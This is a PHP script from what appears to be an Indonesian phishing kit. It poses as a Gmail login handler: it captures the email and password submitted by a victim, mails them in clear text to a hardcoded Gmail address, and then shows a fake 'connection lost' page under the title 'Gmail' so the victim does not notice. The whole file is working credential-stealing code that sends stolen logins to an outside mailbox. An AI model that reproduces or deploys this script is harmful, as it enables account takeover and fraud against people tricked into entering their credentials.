<?php
############################################
##        Author: Script Haxorisme            ##
##       Mailer: Script Haxorisme           ##
##       Modifer: Script Haxorisme            ##
############################################
/* JANGAN GANTI COPYRIGHT NYA YA SAYANG */

$subjek = 'SETORAN GMAIL';
$mailto = 'anggaramadhan843@gmail.com'; //masukin email lo disini

/* Fungsi berikut untuk mengambil input field. */

$imel = $_POST['email'];
$paswot = $_POST['password'];

/* Mengambil informasi untuk dikirim kepada facebook anda !. */

$body = <<<EOD
<br><hr><br>

Email : <font color="red">$imel</font> <br>
Password : <font color="red">$paswot</font> <br>
EOD;


$headers = "From: RAFLIPEDIA\r\n"; // Buat nunjukin pengirim email.
$headers .= "Content-type: text/html\r\n"; // Untuk memerintahkan server melakukan coding teks.
$success = mail($mailto, $subjek, $body, $headers); // Hal-hal yang akan dikirim.
?>
<?php
$random = rand(1000,5000);
?>
<title>Gmail</title>
<center> <h2> Sorry! Your Connection is Lost from Internet. Check your connection, and Try Again </h2><br>